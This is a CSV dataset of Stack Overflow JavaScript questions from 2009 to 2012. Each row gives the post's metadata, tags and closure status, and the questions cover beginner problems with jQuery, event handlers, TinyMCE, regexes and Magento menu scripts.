PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
7582722,09/28/2011 11:44:51,946102,09/15/2011 05:50:44,4,0,Javascript onclick event,"I am using  a drop down of values and on the onclick event of each option i am calling a javascript function taht is working fine for me in all browsers except chrome so please kindly help to solve this problem
Naveed",javascript,option,,,,09/28/2011 15:22:10,not a real question,1,42,3,"Javascript onclick event I am using  a drop down of values and on the onclick event of each option i am calling a javascript function taht is working fine for me in all browsers except chrome so please kindly help to solve this problem
Naveed",2
8142523,11/15/2011 20:10:34,280772,02/24/2010 22:53:36,155,0,some JQuery error,"I am just trying to use this JQuery.Click functionaluty and for some arcane reasons it keeps on failing on some apparant syntactical error. I am not sure why below is my code snippet:

  $(document).ready(function () {

            $('.Trial').click(function () {
                alert(""User clicked on Trial Object"");
            });
        });

I am not sure what is wrong with it?",javascript,jquery,javascript-events,,,11/15/2011 20:55:38,not a real question,1,99,3,"some JQuery error I am just trying to use this JQuery.Click functionaluty and for some arcane reasons it keeps on failing on some apparant syntactical error. I am not sure why below is my code snippet:

  $(document).ready(function () {

            $('.Trial').click(function () {
                alert(""User clicked on Trial Object"");
            });
        });

I am not sure what is wrong with it?",3
2934182,05/29/2010 07:18:22,174908,09/17/2009 11:37:21,58,0,making links with out anchor tag using dojo,"I have a image with link
 `<div id=""img""><a href=""src/blah.html""><img src=""/src/img.png""/></a></div>`
 but i don't wanna use <a> tag for linking.the page has multiple entries like this in a page as it is being populated for a search result.Some 10 or more entries will be there in a page.its all inside a `<div id=""result""></div>`

have an idea for doing it dojo.help me finish that

`function(){
     dojo.query('.Result').forEach(function(item){
     try{
     var href = dojo.query('.img',item)[0]
     //do things
     dojo.connect(Node,'onclick',dojo.hitch(this,function(){
      window.location = location;
     }));`

",javascript,html,dojo,hyperlink,,,open,0,103,8,"making links with out anchor tag using dojo I have a image with link
 `<div id=""img""><a href=""src/blah.html""><img src=""/src/img.png""/></a></div>`
 but i don't wanna use <a> tag for linking.the page has multiple entries like this in a page as it is being populated for a search result.Some 10 or more entries will be there in a page.its all inside a `<div id=""result""></div>`

have an idea for doing it dojo.help me finish that

`function(){
     dojo.query('.Result').forEach(function(item){
     try{
     var href = dojo.query('.img',item)[0]
     //do things
     dojo.connect(Node,'onclick',dojo.hitch(this,function(){
      window.location = location;
     }));`

",4
9026697,01/26/2012 22:54:53,1118349,12/27/2011 22:06:37,10,0,How to pass the reference 'this' to a javascript function from an <a> tag,"I know that this is elementary, but I'm completely unable to pass ""this"" as a parameter to a JavaScript function.  I'm numb from trying...


    <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
    <html xmlns=""http://www.w3.org/1999/xhtml"">
    <head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
    <title>Untitled Document</title>
    <script language=""javascript"" type=""text/javascript"">
    	function ko(control.id){
    	alert(control);
    }
    </script>
    
    <body>
    <div id""lala"">
    	<a id=""la"" href=""javascript:ko(this)"" >Votes & Concerns</a>
    </div>
    
    </body>
    </html>


The alert tells me ""undefined!""",javascript,html,,,,,open,0,123,14,"How to pass the reference 'this' to a javascript function from an <a> tag I know that this is elementary, but I'm completely unable to pass ""this"" as a parameter to a JavaScript function.  I'm numb from trying...


    <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
    <html xmlns=""http://www.w3.org/1999/xhtml"">
    <head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
    <title>Untitled Document</title>
    <script language=""javascript"" type=""text/javascript"">
    	function ko(control.id){
    	alert(control);
    }
    </script>
    
    <body>
    <div id""lala"">
    	<a id=""la"" href=""javascript:ko(this)"" >Votes & Concerns</a>
    </div>
    
    </body>
    </html>


The alert tells me ""undefined!""",2
2243978,02/11/2010 11:06:31,269317,02/09/2010 08:20:32,22,0,remove class from all other list items,"I've gotten help from others on this, but their replies were a little bit too broad to help me... I'm a newb when it comes to javascript so I can't quite wrap my head around their answers (and everything I've tried in the last 3 days hasn't worked.) The working site is here: http://www.studioimbrue.com/beta   The problem is that with the thumbnails, once clicking them it adds the .selected class properly but when clicking on another, it fails to strip the .selected class from any of the other thumbnails. If you can just correct the code I have that would be amazing, and if you feel like explaining what I had wrong, go right ahead!

    $(document).ready(function(){ 
        var activeOpacity   = 1.0,
            inactiveOpacity = 0.6,
            fadeTime = 100,
            clickedClass = ""selected"",
            thumbs = ""#list li"";
    
        $(thumbs).fadeTo(1, inactiveOpacity);
    
        $(thumbs).hover(
            function(){
                $(this).fadeTo(fadeTime, activeOpacity);
            },
            function(){
                // Only fade out if the user hasn't clicked the thumb
                if(!$(this).hasClass(clickedClass)) {
                    $(this).fadeTo(fadeTime, inactiveOpacity);
                }
            });
         $(thumbs).click(function() {
             // Remove selected class from any elements other than this
             var previous = $(thumbs+'.'+clickedClass).eq();
             var clicked = $(this);
             if(clicked !== previous) {
                 previous.removeClass(clickedClass);
             }
             clicked.addClass(clickedClass).fadeTo(fadeTime, activeOpacity);
         });
    });",javascript,jquery,,,,,open,0,498,7,"remove class from all other list items I've gotten help from others on this, but their replies were a little bit too broad to help me... I'm a newb when it comes to javascript so I can't quite wrap my head around their answers (and everything I've tried in the last 3 days hasn't worked.) The working site is here: http://www.studioimbrue.com/beta   The problem is that with the thumbnails, once clicking them it adds the .selected class properly but when clicking on another, it fails to strip the .selected class from any of the other thumbnails. If you can just correct the code I have that would be amazing, and if you feel like explaining what I had wrong, go right ahead!

    $(document).ready(function(){ 
        var activeOpacity   = 1.0,
            inactiveOpacity = 0.6,
            fadeTime = 100,
            clickedClass = ""selected"",
            thumbs = ""#list li"";
    
        $(thumbs).fadeTo(1, inactiveOpacity);
    
        $(thumbs).hover(
            function(){
                $(this).fadeTo(fadeTime, activeOpacity);
            },
            function(){
                // Only fade out if the user hasn't clicked the thumb
                if(!$(this).hasClass(clickedClass)) {
                    $(this).fadeTo(fadeTime, inactiveOpacity);
                }
            });
         $(thumbs).click(function() {
             // Remove selected class from any elements other than this
             var previous = $(thumbs+'.'+clickedClass).eq();
             var clicked = $(this);
             if(clicked !== previous) {
                 previous.removeClass(clickedClass);
             }
             clicked.addClass(clickedClass).fadeTo(fadeTime, activeOpacity);
         });
    });",2
9037570,01/27/2012 17:37:54,1174008,01/27/2012 17:17:00,1,0,Prevent second execution until the first ends in jquery,"I have the following code...

    $(""#myID"").click(function(){
    
        //do some ajax requisition here
        //make it appears in screen with a fadeIn(300)
    
    });

But i need that this function was not called again until the actual execution ends, i tried put many different code before e after the comments but with no success, if you can help me to prevent that second execution!

The fadeIn() don't hold the execution, the code after it was executed while the effect is occurring, can someone help me?

Thanks",javascript,jquery,,,,,open,0,107,9,"Prevent second execution until the first ends in jquery I have the following code...

    $(""#myID"").click(function(){
    
        //do some ajax requisition here
        //make it appears in screen with a fadeIn(300)
    
    });

But i need that this function was not called again until the actual execution ends, i tried put many different code before e after the comments but with no success, if you can help me to prevent that second execution!

The fadeIn() don't hold the execution, the code after it was executed while the effect is occurring, can someone help me?

Thanks",2
10446648,05/04/2012 09:58:42,1281940,03/20/2012 20:48:13,22,0,Magento - this javascript file doesn't merge correctly,"i have a magento 1.6.2 webshop.

I would like to merge the javascript files for optimizing my loadingspeeds.
But when i select merge in the settings my Custom Menu extensions doesn't work anymore.

I guess there is something wrong in the code.
I have tried to contact the developer, but i don't get a reaction ...

This extension is for the navigation menu at the top (with images)

Here is the code of the custommenu.js file:

        function wpShowMenuPopup(objMenu, popupId)
    {
        objMenu = $(objMenu.id); var popup = $(popupId); if (!popup) return;
        popup.style.display = 'block';
        objMenu.addClassName('active');
        var popupWidth = CUSTOMMENU_POPUP_WIDTH;
        if (!popupWidth) popupWidth = popup.getWidth();
        var pos = wpPopupPos(objMenu, popupWidth);
        popup.style.top = pos.top + 'px';
        popup.style.left = pos.left + 'px';
        if (CUSTOMMENU_POPUP_WIDTH) popup.style.width = CUSTOMMENU_POPUP_WIDTH + 'px';
    }
    
    function wpPopupPos(objMenu, w)
    {
        var pos = objMenu.cumulativeOffset();
        var wraper = $('custommenu');
        var posWraper = wraper.cumulativeOffset();
        var wWraper = wraper.getWidth() - CUSTOMMENU_POPUP_RIGHT_OFFSET_MIN;
        var xTop = pos.top - posWraper.top + CUSTOMMENU_POPUP_TOP_OFFSET;
        var xLeft = pos.left - posWraper.left;
        if ((xLeft + w) > wWraper) xLeft = wWraper - w;
        return {'top': xTop, 'left': xLeft};
    }
    
    function wpHideMenuPopup(element, event, popupId, menuId)
    {
        element = $(element.id); var popup = $(popupId); if (!popup) return;
        var current_mouse_target = null;
        if (event.toElement)
        {
            current_mouse_target = event.toElement;
        }
        else if (event.relatedTarget)
        {
            current_mouse_target = event.relatedTarget;
        }
        if (!wpIsChildOf(element, current_mouse_target) && element != current_mouse_target)
        {
            if (!wpIsChildOf(popup, current_mouse_target) && popup != current_mouse_target)
            {
                popup.style.display = 'none';
                $(menuId).removeClassName('active');
            }
        }
    }
    
    function wpIsChildOf(parent, child)
    {
        if (child != null)
        {
            while (child.parentNode)
            {
                if ((child = child.parentNode) == parent)
                {
                    return true;
                }
            }
        }
        return false;
    }

You can see it working on my webshop: [www.liefstoereigenwijs.nl][1]


  [1]: http://www.liefstoereigenwijs.nl

Can anyone see if there is something wrong in the code?
Or has a other solution for my problem?",javascript,optimization,drop-down-menu,magento-1.6,,,open,0,744,8,"Magento - this javascript file doesn't merge correctly i have a magento 1.6.2 webshop.

I would like to merge the javascript files for optimizing my loadingspeeds.
But when i select merge in the settings my Custom Menu extensions doesn't work anymore.

I guess there is something wrong in the code.
I have tried to contact the developer, but i don't get a reaction ...

This extension is for the navigation menu at the top (with images)

Here is the code of the custommenu.js file:

        function wpShowMenuPopup(objMenu, popupId)
    {
        objMenu = $(objMenu.id); var popup = $(popupId); if (!popup) return;
        popup.style.display = 'block';
        objMenu.addClassName('active');
        var popupWidth = CUSTOMMENU_POPUP_WIDTH;
        if (!popupWidth) popupWidth = popup.getWidth();
        var pos = wpPopupPos(objMenu, popupWidth);
        popup.style.top = pos.top + 'px';
        popup.style.left = pos.left + 'px';
        if (CUSTOMMENU_POPUP_WIDTH) popup.style.width = CUSTOMMENU_POPUP_WIDTH + 'px';
    }
    
    function wpPopupPos(objMenu, w)
    {
        var pos = objMenu.cumulativeOffset();
        var wraper = $('custommenu');
        var posWraper = wraper.cumulativeOffset();
        var wWraper = wraper.getWidth() - CUSTOMMENU_POPUP_RIGHT_OFFSET_MIN;
        var xTop = pos.top - posWraper.top + CUSTOMMENU_POPUP_TOP_OFFSET;
        var xLeft = pos.left - posWraper.left;
        if ((xLeft + w) > wWraper) xLeft = wWraper - w;
        return {'top': xTop, 'left': xLeft};
    }
    
    function wpHideMenuPopup(element, event, popupId, menuId)
    {
        element = $(element.id); var popup = $(popupId); if (!popup) return;
        var current_mouse_target = null;
        if (event.toElement)
        {
            current_mouse_target = event.toElement;
        }
        else if (event.relatedTarget)
        {
            current_mouse_target = event.relatedTarget;
        }
        if (!wpIsChildOf(element, current_mouse_target) && element != current_mouse_target)
        {
            if (!wpIsChildOf(popup, current_mouse_target) && popup != current_mouse_target)
            {
                popup.style.display = 'none';
                $(menuId).removeClassName('active');
            }
        }
    }
    
    function wpIsChildOf(parent, child)
    {
        if (child != null)
        {
            while (child.parentNode)
            {
                if ((child = child.parentNode) == parent)
                {
                    return true;
                }
            }
        }
        return false;
    }

You can see it working on my webshop: [www.liefstoereigenwijs.nl][1]


  [1]: http://www.liefstoereigenwijs.nl

Can anyone see if there is something wrong in the code?
Or has a other solution for my problem?",4
10142099,04/13/2012 13:50:06,1331542,04/13/2012 12:11:25,1,0,Jquery Library - Drawing House,"I need some kind of WEB plugin (Javascript probably) where I need to design the house (kitchen,bathroom) with the furniture too.



Somebody know anything like that??


Thank youu!",javascript,jquery,jquery-ui,design,svg,04/13/2012 15:10:46,not a real question,1,26,5,"Jquery Library - Drawing House I need some kind of WEB plugin (Javascript probably) where I need to design the house (kitchen,bathroom) with the furniture too.



Somebody know anything like that??


Thank youu!",5
5656046,04/13/2011 21:42:07,827668,04/10/2011 09:28:08,1,0,Is it valid to define function(json) and if yes what does it mean?,"	$.getJSON(link,function(json)
       {
		    if( json.length> 0)
       {

document.form_reserve.action =""http://localhost/ReserveRoomsBackend.php?		

bldg_number=""+json[0].bldg_number +"" & room_number=""+json[0].room_number;
		document.getElementById(""form_reserve"").style.display = ""block"";
	}
		     else
       {
	       document.getElementById(""label"").style.display = ""block"";
       }

alert(""inside json finction"" + json.length+""  ""+json[0].room_number+""   ""+json

[0].bldg_number);
		}); //.getJSON

	}//doAjaxPost",javascript,json,function,,,04/15/2011 01:45:05,not a real question,1,65,13,"Is it valid to define function(json) and if yes what does it mean? 	$.getJSON(link,function(json)
       {
		    if( json.length> 0)
       {

document.form_reserve.action =""http://localhost/ReserveRoomsBackend.php?		

bldg_number=""+json[0].bldg_number +"" & room_number=""+json[0].room_number;
		document.getElementById(""form_reserve"").style.display = ""block"";
	}
		     else
       {
	       document.getElementById(""label"").style.display = ""block"";
       }

alert(""inside json finction"" + json.length+""  ""+json[0].room_number+""   ""+json

[0].bldg_number);
		}); //.getJSON

	}//doAjaxPost",3
9318501,02/16/2012 20:23:59,1214734,02/16/2012 20:03:44,1,0,Call class instance method onclick javascript,"I have a javascript file with classes which contain method functions. I was wondering how to go about calling a class instance method from an onClick event.

    function MyClass()
    {
        this.instanceData = ""Display Me"";
        
        this.DisplayData = function()
        {
            document.write(this.instanceData);
        }
    }
    
    var classInstance = new MyClass();

How would I call the DisplayData function on classInstance from an onClick event. For example:

    <button onClick=""classInstance.DisplayData()"">Click Me!</button>

Which doesn't work, but helps me clarify what I'm looking to do. Any suggestions?",javascript,class,onclick,,,,open,0,142,6,"Call class instance method onclick javascript I have a javascript file with classes which contain method functions. I was wondering how to go about calling a class instance method from an onClick event.

    function MyClass()
    {
        this.instanceData = ""Display Me"";
        
        this.DisplayData = function()
        {
            document.write(this.instanceData);
        }
    }
    
    var classInstance = new MyClass();

How would I call the DisplayData function on classInstance from an onClick event. For example:

    <button onClick=""classInstance.DisplayData()"">Click Me!</button>

Which doesn't work, but helps me clarify what I'm looking to do. Any suggestions?",3
4223166,11/19/2010 08:14:09,474162,10/13/2010 07:07:20,18,5,"JavaScript and regular expression, only numbers and . ,","Regular expressions is not my thing. Hope you can help me here. 

I have this right now:

/^[0-9]+$/

and i need to change it, so it will allow numbers from 0-9 and only "","" to be in the string 1 time. After the , we can only have as many digits we want but only 2 digits before the "","".

allowed: 66,6666 - 6,66 - 6,6
Not allowed: 666,66 - 66,666abc - abc,666

Hope you can help. ",javascript,regex,,,,,open,0,73,9,"JavaScript and regular expression, only numbers and . , Regular expressions is not my thing. Hope you can help me here. 

I have this right now:

/^[0-9]+$/

and i need to change it, so it will allow numbers from 0-9 and only "","" to be in the string 1 time. After the , we can only have as many digits we want but only 2 digits before the "","".

allowed: 66,6666 - 6,66 - 6,6
Not allowed: 666,66 - 66,666abc - abc,666

Hope you can help. ",2
9889980,03/27/2012 12:57:38,961429,09/23/2011 14:55:19,1,0,How to get li's id's of a ul that is under li ? my code goes like below,"    <li style=""list-type:none;"">1
    <ul>
    <li style=""list-type:none;"">1</li>
    </ul>
    </li>
    <li style=""list-type:none;"">2
    <ul>
    <li style=""list-type:none;"">1</li>
    <li style=""list-type:none;"">2</li>
    </ul>
    </li>


    <script type=""text/javascript"">
    var targetListId = this.currentItem[0].parentNode.id;
    var targetlistlength =
    document.getElementById(targetListId).getElementsByTagName(""li"").length;
    </script>

i want index of li that is having ul .  but the thing is when any li is moving it is getting the top most li only . i want the nth li id

",javascript,,,,,04/18/2012 05:56:22,not a real question,1,110,18,"How to get li's id's of a ul that is under li ? my code goes like below     <li style=""list-type:none;"">1
    <ul>
    <li style=""list-type:none;"">1</li>
    </ul>
    </li>
    <li style=""list-type:none;"">2
    <ul>
    <li style=""list-type:none;"">1</li>
    <li style=""list-type:none;"">2</li>
    </ul>
    </li>


    <script type=""text/javascript"">
    var targetListId = this.currentItem[0].parentNode.id;
    var targetlistlength =
    document.getElementById(targetListId).getElementsByTagName(""li"").length;
    </script>

i want index of li that is having ul .  but the thing is when any li is moving it is getting the top most li only . i want the nth li id

",1
11400659,07/09/2012 18:10:45,993167,10/13/2011 09:50:40,230,0,angularjs ui tinymce integration issue,"I am having problem in integrating AngularJS UI tinymce in the app however it is working fine in jsbin demo (which I created as suggested by [@Andy Joslin][1] to use latest tinymce directive in my [previous question][2]):

http://jsbin.com/itevos/2

However in app I receive this error when I load the app:

    Uncaught TypeError: Cannot read property 'form' of null

which references tiny_mce_jquery_src.js:11955 with that line number being:

    var n = t.getElement().form;

In the app, I checked all js/css files are loaded fine. This is what I have:

    var app_htmleditor_module = angular.module('app_htmleditor', ['ui', 'components']).
        config(['$routeProvider', function($routeProvider) {
            $routeProvider.
                when('/', {
                    templateUrl: getBaseURL() + 'public/tpl/app/htmleditor.htm',
                    controller: HtmlEditorCtrl,
                    reloadOnSearch:false
                }).
                otherwise( {redirectTo: '/'});
        }
    ]);

And textarea:

    <textarea ui-tinymce ng-model=""tinymce"" id=""{{fileUploaderID}}_html_tab"" name=""{{fileUploaderID}}_html_tab""></textarea>


I tried wrapping textarea with `form` tag but still received the same error.

Thanks for your help

  [1]: http://stackoverflow.com/users/1397051/andy-joslin
  [2]: http://stackoverflow.com/questions/11390709/angularjs-navigation-does-not-work-after-tinymce-directive",javascript,debugging,angularjs,angular,,,open,0,276,5,"angularjs ui tinymce integration issue I am having problem in integrating AngularJS UI tinymce in the app however it is working fine in jsbin demo (which I created as suggested by [@Andy Joslin][1] to use latest tinymce directive in my [previous question][2]):

http://jsbin.com/itevos/2

However in app I receive this error when I load the app:

    Uncaught TypeError: Cannot read property 'form' of null

which references tiny_mce_jquery_src.js:11955 with that line number being:

    var n = t.getElement().form;

In the app, I checked all js/css files are loaded fine. This is what I have:

    var app_htmleditor_module = angular.module('app_htmleditor', ['ui', 'components']).
        config(['$routeProvider', function($routeProvider) {
            $routeProvider.
                when('/', {
                    templateUrl: getBaseURL() + 'public/tpl/app/htmleditor.htm',
                    controller: HtmlEditorCtrl,
                    reloadOnSearch:false
                }).
                otherwise( {redirectTo: '/'});
        }
    ]);

And textarea:

    <textarea ui-tinymce ng-model=""tinymce"" id=""{{fileUploaderID}}_html_tab"" name=""{{fileUploaderID}}_html_tab""></textarea>


I tried wrapping textarea with `form` tag but still received the same error.

Thanks for your help

  [1]: http://stackoverflow.com/users/1397051/andy-joslin
  [2]: http://stackoverflow.com/questions/11390709/angularjs-navigation-does-not-work-after-tinymce-directive",4
11406256,07/10/2012 03:39:16,122372,06/13/2009 03:46:57,31,1,How can I put on FaceBook a JavaScript game hosted on Heroku running NodeJS instead of PHP?,How can I get a JavaScript game hosted on Heroku running NodeJS instead of PHP into Facebook? I can't find any examples anywhere. The examples I can find all use PHP instead of NodeJS. And Facebook documentation is very confusing.,javascript,facebook,node.js,heroku,facebook-javascript-sdk,07/11/2012 11:16:00,not a real question,1,40,17,How can I put on FaceBook a JavaScript game hosted on Heroku running NodeJS instead of PHP? How can I get a JavaScript game hosted on Heroku running NodeJS instead of PHP into Facebook? I can't find any examples anywhere. The examples I can find all use PHP instead of NodeJS. And Facebook documentation is very confusing.,5
1697067,11/08/2009 16:34:01,206301,11/08/2009 16:34:01,1,0,javascript eval alternative,"in the following statment, how could i make the ""log.entries[i]"" part a variable?

json.log.entries[i]

eval works but i dont want to use it.

eval(""json"" + ""var"")

I also tried

json[var]

thanks",javascript,,,,,09/23/2011 22:10:32,too localized,1,25,3,"javascript eval alternative in the following statment, how could i make the ""log.entries[i]"" part a variable?

json.log.entries[i]

eval works but i dont want to use it.

eval(""json"" + ""var"")

I also tried

json[var]

thanks",1
11069721,06/17/2012 07:43:17,1461534,06/17/2012 07:31:30,1,0,How to add a link to a button in javascript?,"<div data-role=""content"">
				<button id=""getPicture"">
					Take your picture
				</button>
				<p>
					
				<p>
					<a href=""#second"">Take your picture</a>
				</p>
			</div><!-- /content -->

How to make a button out of this code?",javascript,jquery,html,eclipse,,06/17/2012 07:52:47,not a real question,1,18,10,"How to add a link to a button in javascript? <div data-role=""content"">
				<button id=""getPicture"">
					Take your picture
				</button>
				<p>
					
				<p>
					<a href=""#second"">Take your picture</a>
				</p>
			</div><!-- /content -->

How to make a button out of this code?",4
